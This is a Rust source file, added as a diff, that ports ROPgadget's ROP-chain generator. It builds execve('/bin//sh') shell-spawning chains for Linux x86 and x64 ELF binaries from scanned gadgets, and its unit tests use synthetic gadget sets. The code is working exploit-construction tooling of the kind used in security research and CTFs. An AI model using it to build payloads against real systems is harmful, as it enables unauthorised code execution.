@@ -1,0 +1,710 @@
+//! Linux execve chain builders — a faithful port of ROPgadget's
+//! `ropchain/arch/ropmakerx64.py` (syscall, 59 = `__NR_execve`) and
+//! `ropmakerx86.py` (int 0x80, 11), with the same gadget-selection
+//! semantics:
+//!
+//!   * search order: the (post-dedup) gadget list is REVERSED first —
+//!     "to find the smaller gadget" (ropmakerx64.py:136-137);
+//!   * `__lookingForSomeThing`: the gadget's FIRST instruction must equal
+//!     the wanted text exactly, and every following instruction must be a
+//!     `pop` or a bare `ret` (`ret 0x6` & co. are rejected — they ruin the
+//!     stack pointer);
+//!   * `__lookingForWrite4Where`: first instruction must be
+//!     `mov <size> ptr [<dst>], <src>` with dst/src registers, same tail
+//!     rule, with backtracking over alternative write-what-where gadgets
+//!     when no matching pop/xor exists;
+//!   * `.data` is located by NAME among the non-executable sections
+//!     (ropmakerx64.py:76-80); as a documented extension we fall back to
+//!     the first writable non-executable section when no `.data` exists.
+//!
+//! Deliberate regex deviation: the Python "regex" for the write-what-where
+//! registers (ropmakerx64.py:29, ropmakerx86.py:29) is a buggy character
+//! class that matches any 3-char string over its alphabet; we implement the
+//! INTENDED register set ({rax..r15 minus r9/sp/bp forms, 3-char names} for
+//! x64; {eax,ebx,ecx,edx,esi,edi} for x86).
+
+use std::collections::{HashMap, HashSet};
+
+use rf_core::Arch;
+use rf_scan::Gadget;
+
+use crate::{arch_name, ChainError, ChainWord, GadgetRef, RopChain, WordKind};
+
+/// A non-executable section candidate for the string write. `vaddr` must
+/// already reflect any `--base` rebase and `--offset` slide (the caller
+/// applies them, like ROPgadget's `liboffset`).
+#[derive(Debug, Clone)]
+pub struct DataSection {
+    pub name: String,
+    pub vaddr: u64,
+    pub writable: bool,
+}
+
+const PADDING64: u64 = 0x4141_4141_4141_4141;
+const PADDING32: u64 = 0x4141_4141;
+
+/// x64 write-what-where register set (3-char names; r9 excluded — the
+/// Python `{3}` quantizer can't match its 2 chars either).
+const REGS64: &[&str] = &[
+    "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r10", "r11", "r12", "r13", "r14", "r15",
+];
+const REGS32: &[&str] = &["eax", "ebx", "ecx", "edx", "esi", "edi"];
+
+/// Build a Linux `execve("/bin//sh", NULL, NULL)` chain.
+///
+/// `gadgets` is the post-dedup scan output; `data_sections` the binary's
+/// non-executable sections. Dispatch mirrors ropmaker.py:23-40: ELF x86
+/// and x64 only.
+pub fn build_linux_execve(
+    gadgets: &[Gadget],
+    data_sections: &[DataSection],
+    arch: Arch,
+    format: &str,
+    badbytes: &[u8],
+) -> Result<RopChain, ChainError> {
+    if format != "elf" || !matches!(arch, Arch::X86 | Arch::X64) {
+        return Err(ChainError::Unsupported {
+            arch: arch_name(arch),
+            format: format.to_string(),
+        });
+    }
+    // .data by name (ropmakerx64.py:79), else first writable fallback.
+    let data = data_sections
+        .iter()
+        .find(|s| s.name == ".data")
+        .or_else(|| data_sections.iter().find(|s| s.writable))
+        .ok_or(ChainError::NoWritableSection)?;
+    let data_addr = data.vaddr;
+
+    let mut b = ChainBuilder {
+        words: Vec::new(),
+        gadgets: Vec::new(),
+        gmap: HashMap::new(),
+        padding_const: if arch == Arch::X64 {
+            PADDING64
+        } else {
+            PADDING32
+        },
+    };
+
+    match arch {
+        Arch::X64 => build_x64(&mut b, gadgets, data_addr)?,
+        _ => build_x86(&mut b, gadgets, data_addr)?,
+    }
+
+    let chain = RopChain {
+        arch: arch_name(arch),
+        description: format!(
+            "Linux execve(\"/bin//sh\", NULL, NULL) via {}",
+            if arch == Arch::X64 {
+                "syscall"
+            } else {
+                "int 0x80"
+            }
+        ),
+        word_size: if arch == Arch::X64 { 8 } else { 4 },
+        words: b.words,
+        gadgets: b.gadgets,
+    };
+    // Build-time invariants: gadget words are real scan gadgets, immediates
+    // are badbyte-free.
+    chain.validate(&RopChain::universe_from(gadgets), badbytes)?;
+    Ok(chain)
+}
+
+/// Word emitter with gadget-ref interning (`source_gadget` indexes the
+/// chain's distinct gadget list).
+struct ChainBuilder {
+    words: Vec<ChainWord>,
+    gadgets: Vec<GadgetRef>,
+    gmap: HashMap<(u64, String), usize>,
+    padding_const: u64,
+}
+
+impl ChainBuilder {
+    fn intern(&mut self, g: &Gadget) -> usize {
+        let key = (g.vaddr, g.text());
+        if let Some(&i) = self.gmap.get(&key) {
+            return i;
+        }
+        let i = self.gadgets.len();
+        self.gadgets.push(GadgetRef {
+            vaddr: g.vaddr,
+            text: g.text(),
+        });
+        self.gmap.insert(key, i);
+        i
+    }
+
+    fn gadget(&mut self, g: &Gadget) {
+        let idx = self.intern(g);
+        self.words.push(ChainWord {
+            value: g.vaddr,
+            kind: WordKind::GadgetAddr,
+            comment: g.text(),
+            source_gadget: Some(idx),
+        });
+    }
+
+    fn data(&mut self, value: u64, comment: String) {
+        self.words.push(ChainWord {
+            value,
+            kind: WordKind::DataAddr,
+            comment,
+            source_gadget: None,
+        });
+    }
+
+    fn immediate(&mut self, bytes: &[u8]) {
+        let mut buf = [0u8; 8];
+        buf[..bytes.len()].copy_from_slice(bytes);
+        self.words.push(ChainWord {
+            value: u64::from_le_bytes(buf),
+            kind: WordKind::Immediate,
+            comment: String::new(),
+            source_gadget: None,
+        });
+    }
+
+    /// ropmaker's __padding: for every `pop reg` in the gadget's tail emit
+    /// a padding word — the already-set value when overwriting `reg` would
+    /// clobber state, else the 0x41… constant.
+    fn padding(&mut self, g: &Gadget, already_set: &[(&str, u64)]) {
+        for insn in tail(g) {
+            if let Some(reg) = insn.strip_prefix("pop ") {
+                let reg = reg.trim();
+                let (value, comment) = match already_set.iter().find(|(r, _)| *r == reg) {
+                    Some((_, v)) => (*v, format!("padding without overwrite {reg}")),
+                    None => (self.padding_const, "padding".to_string()),
+                };
+                self.words.push(ChainWord {
+                    value,
+                    kind: WordKind::Padding,
+                    comment,
+                    source_gadget: None,
+                });
+            }
+        }
+    }
+}
+
+fn insns(g: &Gadget) -> Vec<String> {
+    // Gadget::text() is built by joining with " ; " (rf-scan engine.rs).
+    g.text()
+        .split(" ; ")
+        .map(|s| s.trim().to_string())
+        .collect()
+}
+
+fn tail(g: &Gadget) -> Vec<String> {
+    insns(g).into_iter().skip(1).collect()
+}
+
+/// ropmaker's tail rule: every instruction after the first must be a `pop`
+/// or a bare `ret` (ropmakerx64.py:33-42, including the `ret 0x6`
+/// rejection).
+fn clean_tail(g: &Gadget) -> bool {
+    tail(g).iter().all(|insn| {
+        let first = insn.split_whitespace().next().unwrap_or("");
+        if first != "pop" && first != "ret" {
+            return false;
+        }
+        // reject "ret 0x6" etc.; only the bare "ret" survives
+        insn == "ret" || first == "pop"
+    })
+}
+
+/// __lookingForSomeThing: first instruction == `something` exactly, clean
+/// tail, first match in REVERSED gadget order (ropmakerx64.py:46-62 +
+/// 136-137).
+///
+/// iced-x86 renders single-digit immediates as `0x1` where capstone prints
+/// `1` (decimal for 0-9), so each decimal-digit token in the wanted text
+/// also gets a hex-form alternate.
+fn find_exact<'g>(gadgets_rev: &[&'g Gadget], something: &str) -> Option<&'g Gadget> {
+    let forms = wanted_forms(something);
+    gadgets_rev
+        .iter()
+        .copied()
+        .find(|g| forms.contains(&insns(g)[0]) && clean_tail(g))
+}
+
+/// The wanted text plus variants with single decimal-digit immediates in
+/// hex form (`add rax, 1` → also `add rax, 0x1`).
+fn wanted_forms(something: &str) -> Vec<String> {
+    let mut forms = vec![something.to_string()];
+    // token boundaries: whitespace and ", "
+    let bytes = something.as_bytes();
+    for (i, &b) in bytes.iter().enumerate() {
+        if !b.is_ascii_digit() {
+            continue;
+        }
+        let prev_ok = i == 0 || !(bytes[i - 1].is_ascii_alphanumeric() || bytes[i - 1] == b'x');
+        let next_ok = i + 1 == bytes.len() || !bytes[i + 1].is_ascii_alphanumeric();
+        if prev_ok && next_ok {
+            let alt = format!("{}0x{}{}", &something[..i], b as char, &something[i + 1..]);
+            forms.push(alt);
+        }
+    }
+    forms
+}
+
+/// __lookingForWrite4Where: `mov <size> ptr [<dst>], <src>` with register
+/// dst/src, clean tail, skipping gadgets in `excluded`.
+fn find_write4where<'g>(
+    gadgets_rev: &[&'g Gadget],
+    regs: &[&str],
+    excluded: &HashSet<(u64, String)>,
+) -> Option<(&'g Gadget, String, String)> {
+    for g in gadgets_rev.iter().copied() {
+        if excluded.contains(&(g.vaddr, g.text())) {
+            continue;
+        }
+        let first = insns(g).swap_remove(0);
+        // mov <size> ptr [<dst>], <src>   (anchored, like the Python `$`)
+        let Some(rest) = first.strip_prefix("mov ") else {
+            continue;
+        };
+        let Some((size_and_dst, src)) = rest.rsplit_once(", ") else {
+            continue;
+        };
+        let Some(dst) = size_and_dst
+            .strip_suffix(']')
+            .and_then(|s| s.split(" ptr [").nth(1))
+        else {
+            continue;
+        };
+        if !regs.contains(&dst) || !regs.contains(&src) {
+            continue;
+        }
+        if clean_tail(g) {
+            return Some((g, dst.to_string(), src.to_string()));
+        }
+    }
+    None
+}
+
+/// Step 1's backtracking loop (ropmakerx64.py:154-168): find a
+/// write-what-where gadget whose dst/src have a matching pop and the src a
+/// matching xor.
+#[allow(clippy::type_complexity)]
+fn select_write4where<'g>(
+    gadgets_rev: &[&'g Gadget],
+    regs: &[&str],
+    missing_w4w: &str,
+) -> Result<(&'g Gadget, &'g Gadget, &'g Gadget, &'g Gadget), ChainError> {
+    let mut excluded = HashSet::new();
+    loop {
+        let Some((w4w, dst, src)) = find_write4where(gadgets_rev, regs, &excluded) else {
+            return Err(ChainError::MissingGadget(missing_w4w.to_string()));
+        };
+        let Some(pop_dst) = find_exact(gadgets_rev, &format!("pop {dst}")) else {
+            excluded.insert((w4w.vaddr, w4w.text()));
+            continue;
+        };
+        let Some(pop_src) = find_exact(gadgets_rev, &format!("pop {src}")) else {
+            excluded.insert((w4w.vaddr, w4w.text()));
+            continue;
+        };
+        let Some(xor_src) = find_exact(gadgets_rev, &format!("xor {src}, {src}")) else {
+            excluded.insert((w4w.vaddr, w4w.text()));
+            continue;
+        };
+        return Ok((w4w, pop_dst, pop_src, xor_src));
+    }
+}
+
+/// ROPMakerX64.__generate/__buildRopChain (ropmakerx64.py:74-132, 134-221).
+fn build_x64(b: &mut ChainBuilder, gadgets: &[Gadget], data: u64) -> Result<(), ChainError> {
+    let rev: Vec<&Gadget> = gadgets.iter().rev().collect();
+
+    // - Step 1 -- Write-what-where gadgets
+    let (w4w, pop_dst, pop_src, xor_src) =
+        select_write4where(&rev, REGS64, "mov qword ptr [r64], r64")?;
+
+    // - Step 2 -- Init syscall number gadgets
+    let xor_rax = find_exact(&rev, "xor rax, rax")
+        .ok_or_else(|| ChainError::MissingGadget("xor rax, rax".to_string()))?;
+    let inc_rax = [
+        "inc rax",
+        "inc eax",
+        "inc al",
+        "add rax, 1",
+        "add eax, 1",
+        "add al, 1",
+    ]
+    .iter()
+    .find_map(|s| find_exact(&rev, s))
+    .ok_or_else(|| ChainError::MissingGadget("inc rax / add rax, 1".to_string()))?;
+
+    // - Step 3 -- Init syscall arguments gadgets
+    let pop_rdi = find_exact(&rev, "pop rdi")
+        .ok_or_else(|| ChainError::MissingGadget("pop rdi".to_string()))?;
+    let pop_rsi = find_exact(&rev, "pop rsi")
+        .ok_or_else(|| ChainError::MissingGadget("pop rsi".to_string()))?;
+    let pop_rdx = find_exact(&rev, "pop rdx")
+        .ok_or_else(|| ChainError::MissingGadget("pop rdx".to_string()))?;
+
+    // - Step 4 -- Syscall gadget
+    let syscall =
+        find_exact(&rev, "syscall").ok_or_else(|| ChainError::MissingGadget("syscall".into()))?;
+
+    // - Step 5 -- Build the ROP chain (ropmakerx64.py:92-132 line by line)
+    let dst_reg = insns(pop_dst)
+        .swap_remove(0)
+        .split_whitespace()
+        .nth(1)
+        .unwrap_or("")
+        .to_string();
+    let dst_reg = dst_reg.as_str();
+
+    b.gadget(pop_dst);
+    b.data(data, "@ .data".to_string());
+    b.padding(pop_dst, &[]);
+
+    b.gadget(pop_src);
+    b.immediate(b"/bin//sh");
+    b.padding(pop_src, &[(dst_reg, data)]);
+
+    b.gadget(w4w);
+    b.padding(w4w, &[]);
+
+    b.gadget(pop_dst);
+    b.data(data + 8, "@ .data + 8".to_string());
+    b.padding(pop_dst, &[]);
+
+    b.gadget(xor_src);
+    b.padding(xor_src, &[]);
+
+    b.gadget(w4w);
+    b.padding(w4w, &[]);
+
+    b.gadget(pop_rdi);
+    b.data(data, "@ .data".to_string());
+    b.padding(pop_rdi, &[]);
+
+    b.gadget(pop_rsi);
+    b.data(data + 8, "@ .data + 8".to_string());
+    b.padding(pop_rsi, &[("rdi", data)]);
+
+    b.gadget(pop_rdx);
+    b.data(data + 8, "@ .data + 8".to_string());
+    b.padding(pop_rdx, &[("rdi", data), ("rsi", data + 8)]);
+
+    b.gadget(xor_rax);
+    b.padding(xor_rax, &[("rdi", data), ("rsi", data + 8)]);
+
+    for _ in 0..59 {
+        b.gadget(inc_rax);
+        b.padding(inc_rax, &[("rdi", data), ("rsi", data + 8)]);
+    }
+
+    b.gadget(syscall);
+    Ok(())
+}
+
+/// ROPMakerX86.__generate/__buildRopChain (ropmakerx86.py:74-143, 145-219).
+fn build_x86(b: &mut ChainBuilder, gadgets: &[Gadget], data: u64) -> Result<(), ChainError> {
+    let rev: Vec<&Gadget> = gadgets.iter().rev().collect();
+
+    // - Step 1 -- Write-what-where gadgets
+    let (w4w, pop_dst, pop_src, xor_src) =
+        select_write4where(&rev, REGS32, "mov dword ptr [r32], r32")?;
+
+    // - Step 2 -- Init syscall number gadgets
+    let xor_eax = find_exact(&rev, "xor eax, eax")
+        .ok_or_else(|| ChainError::MissingGadget("xor eax, eax".to_string()))?;
+    let inc_eax = find_exact(&rev, "inc eax")
+        .ok_or_else(|| ChainError::MissingGadget("inc eax".to_string()))?;
+
+    // - Step 3 -- Init syscall arguments gadgets
+    let pop_ebx = find_exact(&rev, "pop ebx")
+        .ok_or_else(|| ChainError::MissingGadget("pop ebx".to_string()))?;
+    let pop_ecx = find_exact(&rev, "pop ecx")
+        .ok_or_else(|| ChainError::MissingGadget("pop ecx".to_string()))?;
+    let pop_edx = find_exact(&rev, "pop edx")
+        .ok_or_else(|| ChainError::MissingGadget("pop edx".to_string()))?;
+
+    // - Step 4 -- Syscall gadget
+    let syscall = find_exact(&rev, "int 0x80")
+        .ok_or_else(|| ChainError::MissingGadget("int 0x80".to_string()))?;
+
+    // - Step 5 -- Build the ROP chain (ropmakerx86.py:92-143 line by line)
+    let dst_reg = insns(pop_dst)
+        .swap_remove(0)
+        .split_whitespace()
+        .nth(1)
+        .unwrap_or("")
+        .to_string();
+    let dst_reg = dst_reg.as_str();
+
+    b.gadget(pop_dst);
+    b.data(data, "@ .data".to_string());
+    b.padding(pop_dst, &[]);
+
+    b.gadget(pop_src);
+    b.immediate(b"/bin");
+    b.padding(pop_src, &[(dst_reg, data)]);
+
+    b.gadget(w4w);
+    b.padding(w4w, &[]);
+
+    b.gadget(pop_dst);
+    b.data(data + 4, "@ .data + 4".to_string());
+    b.padding(pop_dst, &[]);
+
+    b.gadget(pop_src);
+    b.immediate(b"//sh");
+    b.padding(pop_src, &[(dst_reg, data + 4)]);
+
+    b.gadget(w4w);
+    b.padding(w4w, &[]);
+
+    b.gadget(pop_dst);
+    b.data(data + 8, "@ .data + 8".to_string());
+    b.padding(pop_dst, &[]);
+
+    b.gadget(xor_src);
+    b.padding(xor_src, &[]);
+
+    b.gadget(w4w);
+    b.padding(w4w, &[]);
+
+    b.gadget(pop_ebx);
+    b.data(data, "@ .data".to_string());
+    b.padding(pop_ebx, &[]);
+
+    b.gadget(pop_ecx);
+    b.data(data + 8, "@ .data + 8".to_string());
+    b.padding(pop_ecx, &[("ebx", data)]);
+
+    b.gadget(pop_edx);
+    b.data(data + 8, "@ .data + 8".to_string());
+    b.padding(pop_edx, &[("ebx", data), ("ecx", data + 8)]);
+
+    b.gadget(xor_eax);
+    b.padding(xor_eax, &[("ebx", data), ("ecx", data + 8)]);
+
+    for _ in 0..11 {
+        b.gadget(inc_eax);
+        b.padding(inc_eax, &[("ebx", data), ("ecx", data + 8)]);
+    }
+
+    b.gadget(syscall);
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn gadget(vaddr: u64, text: &str) -> Gadget {
+        Gadget {
+            vaddr,
+            bytes: Vec::new(),
+            insns: text.split(" ; ").map(|s| s.to_string()).collect(),
+            delay_slot: false,
+        }
+    }
+
+    fn x64_gadget_set() -> Vec<Gadget> {
+        // Minimal sufficient set, vaddr-ascending (reversed during search,
+        // so the HIGHEST vaddr of each text wins).
+        vec![
+            gadget(0x1000, "mov qword ptr [rdi], rsi ; ret"),
+            gadget(0x1010, "pop rdi ; ret"),
+            gadget(0x1014, "pop rdi ; ret"), // duplicate text, higher vaddr wins
+            gadget(0x1020, "pop rsi ; ret"),
+            gadget(0x1030, "xor rsi, rsi ; ret"),
+            gadget(0x1040, "xor rax, rax ; ret"),
+            gadget(0x1050, "inc rax ; ret"),
+            gadget(0x1060, "add rax, 1 ; ret"),
+            gadget(0x1070, "pop rdx ; ret"),
+            gadget(0x1080, "syscall"),
+            gadget(0x1090, "pop rbx ; ret 0x6"), // dirty ret — never selected
+        ]
+    }
+
+    fn x86_gadget_set() -> Vec<Gadget> {
+        vec![
+            gadget(0x1000, "mov dword ptr [edx], eax ; ret"),
+            gadget(0x1010, "pop edx ; ret"),
+            gadget(0x1020, "pop eax ; ret"),
+            gadget(0x1030, "xor eax, eax ; ret"),
+            gadget(0x1040, "inc eax ; ret"),
+            gadget(0x1050, "pop ebx ; ret"),
+            gadget(0x1060, "pop ecx ; ret"),
+            gadget(0x1070, "int 0x80"),
+        ]
+    }
+
+    fn data() -> Vec<DataSection> {
+        vec![
+            DataSection {
+                name: ".got".into(),
+                vaddr: 0x600000,
+                writable: true,
+            },
+            DataSection {
+                name: ".data".into(),
+                vaddr: 0x6bc080,
+                writable: true,
+            },
+        ]
+    }
+
+    #[test]
+    fn reversed_search_prefers_higher_vaddr() {
+        let g = x64_gadget_set();
+        let rev: Vec<&Gadget> = g.iter().rev().collect();
+        let found = find_exact(&rev, "pop rdi").unwrap();
+        assert_eq!(found.vaddr, 0x1014, "reversed order picks the last copy");
+    }
+
+    #[test]
+    fn tail_rule_rejects_ret_with_offset() {
+        let g = gadget(0x1, "pop rdi ; ret 0x6");
+        assert!(!clean_tail(&g));
+        let g = gadget(0x1, "pop rdi ; pop rsi ; ret");
+        assert!(clean_tail(&g));
+        let g = gadget(0x1, "pop rdi ; add rsp, 8 ; ret");
+        assert!(!clean_tail(&g));
+    }
+
+    #[test]
+    fn x64_chain_structure_and_semantics() {
+        let g = x64_gadget_set();
+        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();
+        assert_eq!(chain.word_size, 8);
+
+        // word sequence: popDst, @.data, popSrc, "/bin//sh", w4w, popDst,
+        // @.data+8, xorSrc, w4w, popRdi, @.data, popRsi, @.data+8, popRdx,
+        // @.data+8, xorRax, 59×incRax, syscall
+        let kinds: Vec<WordKind> = chain.words.iter().map(|w| w.kind).collect();
+        assert_eq!(
+            kinds[..15],
+            [
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+                WordKind::GadgetAddr,
+                WordKind::Immediate,
+                WordKind::GadgetAddr,
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+                WordKind::GadgetAddr,
+                WordKind::GadgetAddr,
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+                WordKind::GadgetAddr,
+                WordKind::DataAddr,
+            ]
+        );
+        let syscall_pos = 16 + 59;
+        assert_eq!(kinds.len(), syscall_pos + 1);
+        assert_eq!(chain.words[syscall_pos].comment, "syscall");
+
+        // immediates and data addresses
+        assert_eq!(chain.words[3].value, u64::from_le_bytes(*b"/bin//sh"));
+        assert_eq!(chain.words[1].value, 0x6bc080);
+        assert_eq!(chain.words[6].value, 0x6bc088);
+
+        // the write-what-where gadget is the one from our set
+        assert_eq!(chain.words[4].comment, "mov qword ptr [rdi], rsi ; ret");
+        // inc preference: "inc rax" beats "add rax, 1"
+        assert!(chain.words[16].comment.starts_with("inc rax"));
+
+        // every gadget word references a real gadget
+        let universe = RopChain::universe_from(&g);
+        chain.validate(&universe, &[]).unwrap();
+
+        // raw bytes: word 1 is the .data address in LE
+        let raw = chain.to_bytes();
+        assert_eq!(&raw[8..16], &0x6bc080u64.to_le_bytes());
+        assert_eq!(&raw[24..32], b"/bin//sh");
+    }
+
+    #[test]
+    fn x64_backtracks_when_write4where_has_no_pop() {
+        let mut g = x64_gadget_set();
+        // A HIGHER-vaddr w4w candidate (found first in reversed order)
+        // whose dst has no pop gadget → the builder must backtrack to the
+        // lower-vaddr [rdi],rsi gadget.
+        g.push(gadget(0x3000, "mov qword ptr [r15], r14 ; ret"));
+        let chain = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap();
+        assert!(chain
+            .gadgets
+            .iter()
+            .any(|gr| gr.text == "mov qword ptr [rdi], rsi ; ret"));
+        assert!(!chain
+            .gadgets
+            .iter()
+            .any(|gr| gr.text == "mov qword ptr [r15], r14 ; ret"));
+    }
+
+    #[test]
+    fn x86_chain_structure() {
+        let g = x86_gadget_set();
+        let chain = build_linux_execve(&g, &data(), Arch::X86, "elf", &[]).unwrap();
+        assert_eq!(chain.word_size, 4);
+        // 3 writes for "/bin\0//sh": 9 w4w-region words + popEbx/popEcx/
+        // popEdx blocks + xorEax + 11×inc + int 0x80
+        let last = chain.words.last().unwrap();
+        assert_eq!(last.comment, "int 0x80");
+        let imm: Vec<u64> = chain
+            .words
+            .iter()
+            .filter(|w| w.kind == WordKind::Immediate)
+            .map(|w| w.value)
+            .collect();
+        assert_eq!(
+            imm,
+            vec![
+                u32::from_le_bytes(*b"/bin") as u64,
+                u32::from_le_bytes(*b"//sh") as u64
+            ]
+        );
+        let universe = RopChain::universe_from(&g);
+        chain.validate(&universe, &[]).unwrap();
+    }
+
+    #[test]
+    fn missing_gadgets_are_structured_errors() {
+        let g = vec![gadget(0x1000, "pop rdi ; ret")];
+        let err = build_linux_execve(&g, &data(), Arch::X64, "elf", &[]).unwrap_err();
+        assert!(matches!(err, ChainError::MissingGadget(_)));
+        assert!(err.to_string().contains("mov qword ptr [r64], r64"));
+
+        // no writable section at all
+        let err = build_linux_execve(&x64_gadget_set(), &[], Arch::X64, "elf", &[]).unwrap_err();
+        assert!(matches!(err, ChainError::NoWritableSection));
+
+        // unsupported arch/format (ropmaker.py:23-40 dispatch)
+        let err =
+            build_linux_execve(&x64_gadget_set(), &data(), Arch::Arm64, "elf", &[]).unwrap_err();
+        assert!(matches!(err, ChainError::Unsupported { .. }));
+        let err = build_linux_execve(&x64_gadget_set(), &data(), Arch::X64, "pe", &[]).unwrap_err();
+        assert!(matches!(err, ChainError::Unsupported { .. }));
+    }
+
+    #[test]
+    fn badbyte_in_data_addr_fails_validation() {
+        let g = x64_gadget_set();
+        // 0x6bc080 packs with a 0x00 byte at word size 8
+        let err = build_linux_execve(&g, &data(), Arch::X64, "elf", &[0x00]).unwrap_err();
+        assert!(matches!(err, ChainError::InvalidWord { .. }));
+    }
+
+    #[test]
+    fn data_fallback_to_writable_section() {
+        let g = x64_gadget_set();
+        let sections = vec![DataSection {
+            name: ".got.plt".into(),
+            vaddr: 0x600000,
+            writable: true,
+        }];
+        let chain = build_linux_execve(&g, &sections, Arch::X64, "elf", &[]).unwrap();
+        assert_eq!(chain.words[1].value, 0x600000, "fell back to .got.plt");
+    }
+}
